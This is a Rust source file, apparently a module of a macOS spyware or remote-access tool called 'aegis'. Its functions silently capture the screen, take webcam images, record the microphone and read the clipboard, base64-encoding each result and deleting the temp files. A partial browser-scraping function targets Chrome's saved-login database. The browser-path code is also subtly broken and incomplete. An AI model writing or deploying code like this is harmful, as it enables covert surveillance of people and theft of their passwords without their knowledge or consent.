use base64::Engine;
use std::process::Command;
use std::fs;

pub fn capture_screen() -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_shot.png";
    let _ = Command::new("screencapture").arg("-x").arg(temp_file).output();
    
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Screen capture failed".into())
    }
}

pub fn capture_webcam() -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_cam.png";
    // macOS uses avfoundation for cameras
    let _ = Command::new("ffmpeg")
        .args(&[
            "-f", "avfoundation", "-framerate", "30", "-i", "0:none",
            "-frames:v", "1", "-y", temp_file
        ])
        .output();
        
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Webcam capture failed".into())
    }
}

pub fn record_audio(duration_secs: u32) -> Result<String, Box<dyn std::error::Error>> {
    let temp_file = "/tmp/aegis_mic.wav";
    let _ = Command::new("ffmpeg")
        .args(&[
            "-f", "avfoundation", "-i", ":0",
            "-t", &duration_secs.to_string(),
            "-y", temp_file
        ])
        .output();
        
    if fs::metadata(temp_file).is_ok() {
        let data = fs::read(temp_file)?;
        let _ = fs::remove_file(temp_file);
        Ok(base64::engine::general_purpose::STANDARD.encode(data))
    } else {
        Err("Audio recording failed".into())
    }
}

pub fn get_clipboard() -> String {
    let output = Command::new("pbpaste").output();
    if output.is_ok() {
        String::from_utf8_lossy(&output.unwrap().stdout).to_string()
    } else {
        String::new()
    }
}

pub fn get_recent_files() -> Vec<String> {
    // macOS uses NSDocumentController, but we can parse ~/Library/Application Support/com.apple.recentitems
    // Simplified: Return empty for now
    vec![]
}

pub fn scrape_browser() -> serde_json::Value {
    let mut result = serde_json::json!({ "chrome": [], "safari": [] });
    
    // Safari uses Keychain, Chrome uses SQLite
    let chrome_db = dirs::data_dir().and_then(|d| d.join("Google").join("Chrome").join("Application Support").join("Google").join("Chrome").join("Default").join("Login Data"));
    // Note: macOS path is slightly different
    
    result
}